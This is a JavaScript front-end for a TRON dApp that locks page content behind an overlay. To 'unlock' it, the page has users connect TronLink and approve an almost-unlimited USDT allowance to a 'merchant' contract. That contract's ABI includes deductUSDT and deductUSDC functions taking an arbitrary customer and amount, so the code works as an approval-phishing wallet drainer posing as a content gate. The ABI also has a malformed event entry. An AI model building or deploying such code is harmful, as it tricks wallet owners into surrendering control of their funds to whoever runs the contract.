// src/main.js
// 🚨 最終穩定版：智能模式，連接後先檢查鏈上狀態，未授權則等待用戶點擊按鈕 🚨

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
// TRON 默認地址 (41開頭的21字節，代表未連接)
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000';
// ERC20 Max 授權值 (2^256 - 1) 的近似值，TronLink 要求低於 2^256 - 1
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb; // 保持 TronWeb
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let provider; // 存储钱包提供者
let isAuthorizedOnChain = false; // 鏈上是否已授權的狀態

// --- UI 元素 (假設您的 HTML 中有這些 ID) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const authorizeButton = document.getElementById('authorizeButton'); 

// --- 辅助函数 ---
function showOverlay(message) {
    if (overlayMessage) overlayMessage.innerHTML = message;
    if (blurOverlay) blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    if (overlayMessage) overlayMessage.innerHTML = '';
    if (blurOverlay) blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    // isAuthorized: true 表示已完成兩步授權
    isAuthorizedOnChain = isAuthorized; // 更新全局狀態
    
    if (isAuthorized) {
        // 如果已授權，隱藏鎖定元素，顯示內容
        if (blurOverlay) blurOverlay.style.display = 'none';
        if (lockedPrompt) lockedPrompt.style.display = 'none';
        if (authorizeButton) authorizeButton.style.display = 'none'; // 隱藏授權按鈕
    } else {
        // 如果未授權，顯示鎖定元素，顯示授權按鈕
        if (blurOverlay) blurOverlay.style.display = 'flex';
        if (lockedPrompt) lockedPrompt.style.display = 'flex';
        // 只有在已連接錢包時才顯示授權按鈕
        if (authorizeButton) authorizeButton.style.display = isConnectedFlag ? 'block' : 'none'; 
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
            updateContentLock(false); // 恢復鎖定的狀態
            hideOverlay();
        }
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
let txCount = 0;

async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please approve in your wallet!`);

    try {
        const txHash = await methodCall.send({
            feeLimit: 150_000_000,
            callValue: callValue,
            shouldPollResponse: false
        });

        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
            throw new Error(`TronLink/Wallet did not return a valid transaction hash.`);
        }

        // 🚨 樂觀判斷：立即返回成功 (廣播成功即解鎖)
        showOverlay(`Step ${txCount}/${totalTxs}: Operation broadcast successful! TxID: ${txHash.substring(0, 6)}...`);
        await new Promise(resolve => setTimeout(resolve, 500)); 

        return txHash;

    } catch (error) {
        if (error.message && (error.message.includes('User canceled') || error.message.includes('用戶在錢包中取消了操作'))) {
            throw new Error('用戶在錢包中取消了操作。');
        }
        const errorMessage = error.message || (typeof error === 'string' ? error : 'Unknown error during transaction.');
        throw new Error(`交易失敗，錯誤訊息: ${errorMessage}`);
    }
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    // 契約實例化
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}


// ---------------------------------------------
// ⭐️ 鏈上狀態檢查的函數 ⭐️
// ---------------------------------------------
async function checkAuthorizationStatus(address) {
    if (!merchantContract || !usdtContract) return { authorized: false, allowanceOK: false, allOK: false };
    
    // 1. 檢查合約授權狀態 (authorized)
    let isConnectedAuthorized = false;
    try {
        const result = await merchantContract.authorized(address).call();
        isConnectedAuthorized = (result === true || result === 'true');
    } catch (e) {
        console.error("Error checking contract authorization status:", e);
        isConnectedAuthorized = false;
    }

    // 2. 檢查 USDT Max 代幣扣款額度 (Allowance)
    let isAllowanceSufficient = false;
    // 這裡我們假設只需要一個高額度即可，而不是完全等於 MAX_UINT
    const MIN_REQUIRED_ALLOWANCE_BN = tronWeb.toBigNumber("100000000000000000000000000000000"); // 例如，足夠大的數值 (10^33)
    
    try {
        // TRC20 allowance 函數通常返回一個包含 'remaining' 的物件
        const allowanceResult = await usdtContract.allowance(address, MERCHANT_CONTRACT_ADDRESS).call();
        const currentAllowance = tronWeb.toBigNumber(allowanceResult.remaining || allowanceResult); 
        
        // 檢查當前額度是否大於最小需求
        isAllowanceSufficient = currentAllowance.gte(MIN_REQUIRED_ALLOWANCE_BN);
    } catch (e) {
        console.error("Error checking USDT allowance status:", e);
        isAllowanceSufficient = false;
    }

    return {
        authorized: isConnectedAuthorized,
        allowanceOK: isAllowanceSufficient,
        allOK: isConnectedAuthorized && isAllowanceSufficient
    };
}


// --- 連線邏輯 (DApp 瀏覽器兼容) ---
async function connectWalletLogic() {
    console.log("connectWalletLogic called");
    showOverlay('Connecting to wallet...');
    txCount = 0;

    try {
        if (typeof window.tronWeb !== 'undefined') {
            const isReady = await new Promise(resolve => {
                // 等待 TronWeb 被完全注入和初始化
                let checkInterval = setInterval(() => {
                    if (window.tronWeb && window.tronWeb.ready) {
                        clearInterval(checkInterval);
                        resolve(true);
                    }
                }, 100);
                setTimeout(() => { clearInterval(checkInterval); resolve(window.tronWeb && window.tronWeb.ready || false); }, 3000);  
            });

            if (isReady) {
                tronWeb = window.tronWeb;
                let currentAddressHex = tronWeb.defaultAddress.hex;
                
                // 如果地址是默認值 (TronLink 擴充功能未解鎖或未連接)
                if (!currentAddressHex || currentAddressHex === DEFAULT_TRON_ADDRESS_HEX) {
                    if (window.tronLink && window.tronLink.request) {
                        console.log("No address found, requesting accounts via tronLink.request...");
                        try {
                            // 觸發連接/授權彈窗
                            await window.tronLink.request({ method: 'tron_requestAccounts' });
                            currentAddressHex = tronWeb.defaultAddress.hex; // 重新檢查地址
                        } catch (requestError) {
                            console.error("TronLink requestAccounts failed (User likely canceled):", requestError);
                            showOverlay("Connection failed: Wallet authorization denied or canceled.");
                            return false;  
                        }
                    }
                }
                
                if (currentAddressHex && currentAddressHex !== DEFAULT_TRON_ADDRESS_HEX) {
                    userAddress = tronWeb.address.fromHex(currentAddressHex);
                    provider = "TronLink/DApp Browser";
                    console.log("✅ Wallet connected, address:", userAddress);
                    
                    await initializeContracts(); // 必須先初始化合約
                    updateConnectionUI(true, userAddress);
                    return true;
                }
            } else {
                 console.warn("TronWeb failed to become ready within the timeout.");
            }
        }
        
        updateConnectionUI(false);
        showOverlay('🔴 Connection failed: No supported TRON wallet detected or wallet is locked.');
        return false;

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        return false;
    }
}


// ---------------------------------------------
// ⭐️ 處理實際交易的授權邏輯 ⭐️
// ---------------------------------------------
async function connectAndAuthorize() {
    txCount = 0; // 重置交易計數器

    try {
        if (!merchantContract || !tronWeb || !userAddress) {
            throw new Error("Wallet not initialized. Please reconnect.");
        }
        
        // 1. 檢查當前鏈上狀態，只發送缺少的交易
        const status = await checkAuthorizationStatus(userAddress);
        let transactionsToSend = [];
        
        if (!status.authorized) transactionsToSend.push({
            call: merchantContract.connectAndAuthorize(),
            message: "Sending contract authorization operation"
        });
        
        if (!status.allowanceOK) transactionsToSend.push({
            call: usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
            message: `Setting USDT Max allowance (final step - please approve)`
        });
        
        if (transactionsToSend.length === 0) {
            showOverlay('Already fully authorized. Unlocking...');
            return true;
        }
        
        // 2. 執行所有缺少的交易
        for (const [index, tx] of transactionsToSend.entries()) {
            await sendTransaction(tx.call, tx.message, transactionsToSend.length);
        }
        
        // 由於是樂觀模式，廣播成功即視為成功
        return true;
        
    } catch (error) {
        console.error("Authorization Failed:", error);
        const displayError = error.message.includes('用戶在錢包中取消了操作') 
            ? 'Authorization canceled by user.' 
            : `Authorization failed! Error message: ${error.message}.`;
            
        showOverlay(`🔴 ${displayError} Please try again.`);
        return false;
    }
}


// ---------------------------------------------
// ⭐️ 連線成功後處理：先檢查狀態，再決定是否要求用戶簽名 ⭐️
// ---------------------------------------------
async function handlePostConnection() {
    console.log("handlePostConnection called");
    if (!isConnectedFlag) {
        updateContentLock(false);
        return;
    }
    
    // 1. 檢查鏈上授權狀態
    showOverlay('Checking on-chain authorization status...');
    const status = await checkAuthorizationStatus(userAddress);
    
    if (status.allOK) {
        // 2. 如果狀態都 OK，則直接解鎖 (解決重新整理重複簽名問題)
        console.log("✅ On-chain status is Authorized and Allowance is OK. Skipping signature.");
        showOverlay('✅ Already authorized! Unlocking data...');
        updateContentLock(true);
        await new Promise(resolve => setTimeout(resolve, 1000));
        hideOverlay();
        return;
    }
    
    // 3. 如果未授權，顯示提示和按鈕
    console.log(`⚠️ Authorization incomplete: connect=${status.authorized}, allowance=${status.allowanceOK}. Asking for user action.`);
    showOverlay('⚠️ Authorization required. Please click the Authorize button to proceed.');
    updateContentLock(false); // 保持鎖定，顯示授權按鈕
}


// ---------------------------------------------
// 主連接入口函數 (供 Connect Button 點擊)
// ---------------------------------------------
async function connectWallet() {
    console.log("connectWallet called");
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        isAuthorizedOnChain = false;
        provider = null;
        updateConnectionUI(false);
        updateContentLock(false);  
        if (connectButton) connectButton.disabled = false;
        return;
    }

    // 嘗試連接錢包
    const connected = await connectWalletLogic();

    if (connected) {
        // 連接成功後，進入狀態檢查流程
        await handlePostConnection();
    }

    if (connectButton) connectButton.disabled = false;
}

// ---------------------------------------------
// 頁面啟動和事件監聽器
// ---------------------------------------------

// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);

// ⭐️ 授權按鈕的點擊事件監聽器 ⭐️
if (authorizeButton) authorizeButton.addEventListener('click', async () => {
    if (!isConnectedFlag) {
        showOverlay("Please connect your wallet first.");
        return;
    }
    if (authorizeButton) authorizeButton.disabled = true;

    // 啟動授權流程
    const authSuccess = await connectAndAuthorize();
    
    if(authSuccess) {
        // 交易廣播成功，重新檢查鏈上狀態並解鎖
        await handlePostConnection(); 
    } else {
        // 交易失敗，保持鎖定
        updateContentLock(false);
    }
    if (authorizeButton) authorizeButton.disabled = false;
});


// 頁面啟動：初始化為未連接狀態，並設置初始鎖定狀態
updateConnectionUI(false);
updateContentLock(false);

// 額外：嘗試在頁面載入時自動連接 (DApp 瀏覽器會自動連接)
window.onload = () => {
    // 延遲執行，確保 window.tronWeb 已經被注入
    setTimeout(async () => {
        // 只有在未連接狀態下才嘗試自動連接
        if (!isConnectedFlag) {
            console.log("Window loaded. Checking for auto-connect...");
            await connectWalletLogic();
            // handlePostConnection 會在 connectWalletLogic 內部成功時被呼叫
        }
    }, 500); // 給 TronLink 注入時間 
};